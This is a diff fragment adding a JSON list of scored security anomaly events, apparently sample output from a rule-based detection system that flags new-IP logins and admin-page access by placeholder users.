+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095313Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=admin_access result=success resource=/admin/order_list.php?page=1"
+  },
+  {
+    "event_id": "anom-5800a8950e982129c3c5b751ef189615",
+    "event_time": "2026-11-06T08:25:00Z",
+    "detect_time": "2026-11-17T09:29:31.095493Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "logout",
+    "object_type": "uri",
+    "object_id": "/admin/logout.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "resource",
+        "profile_group": "access",
+        "expected": [
+          "/admin/login.php",
+          "sshd",
+          "/admin/dashboard.php",
+          "/admin/user_list.php?page=1",
+          "/admin/order_list.php?page=1"
+        ],
+        "actual": "/admin/logout.php",
+        "deviation_type": "sensitive_resource_access",
+        "severity": "high",
+        "confidence": 0.61,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "src_ip": "10.0.0.52",
+      "resource": "/admin/logout.php"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1010",
+      "LOG-20261106-1002"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095493Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=logout result=success resource=/admin/logout.php"
+  },
+  {
+    "event_id": "anom-842e4b1fcbc1d8788528720471a25566",
+    "event_time": "2026-11-06T08:25:00Z",
+    "detect_time": "2026-11-17T09:29:31.095524Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "logout",
+    "object_type": "uri",
+    "object_id": "/admin/logout.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 70.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "resource",
+        "profile_group": "access",
+        "expected": [
+          "/admin/login.php",
+          "sshd",
+          "/admin/dashboard.php",
+          "/admin/user_list.php?page=1",
+          "/admin/order_list.php?page=1"
+        ],
+        "actual": "/admin/logout.php",
+        "deviation_type": "sensitive_resource_access",
+        "severity": "high",
+        "confidence": 0.61,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "admin_resource_access"
+    ],
+    "evidence": {
+      "resource": "/admin/logout.php",
+      "user_id": "zhangsan"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1010"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095524Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=logout result=success resource=/admin/logout.php"
+  },
+  {
+    "event_id": "anom-4d466f859b3ed72e64525bf209b302ce",
+    "event_time": "2026-11-06T08:25:00Z",
+    "detect_time": "2026-11-17T09:29:31.095455Z",
+    "tenant_id": "default",
+    "user_id": "zhangsan",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "logout",
+    "object_type": "uri",
+    "object_id": "/admin/logout.php",
+    "attack_type": "sensitive_access",
+    "risk_score": 65.0,
+    "risk_level": "high",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "resource",
+        "profile_group": "access",
+        "expected": [
+          "/admin/login.php",
+          "sshd",
+          "/admin/dashboard.php",
+          "/admin/user_list.php?page=1",
+          "/admin/order_list.php?page=1"
+        ],
+        "actual": "/admin/logout.php",
+        "deviation_type": "sensitive_resource_access",
+        "severity": "high",
+        "confidence": 0.61,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "zhangsan",
+      "sensitive_count_5m": 7,
+      "resource": "/admin/logout.php"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1010"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095455Z",
+    "related_logs_summary": "user=zhangsan src_ip=10.0.0.52 action=logout result=success resource=/admin/logout.php"
+  },
+  {
+    "event_id": "anom-de27929bd74daa0d300f75892c412273",
+    "event_time": "2026-11-06T08:30:00Z",
+    "detect_time": "2026-11-17T09:29:31.095698Z",
+    "tenant_id": "default",
+    "user_id": "lisi",
+    "src_ip": "10.0.0.52",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "sshd",
+    "attack_type": "account_takeover",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.43, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.43,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_ip"
+    ],
+    "evidence": {
+      "user_id": "lisi",
+      "new_ip": "10.0.0.52"
+    },
+    "related_event_ids": [
+      "LOG-20261106-1015"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095698Z",
+    "related_logs_summary": "user=lisi src_ip=10.0.0.52 action=login result=success resource=sshd"
+  }
+]
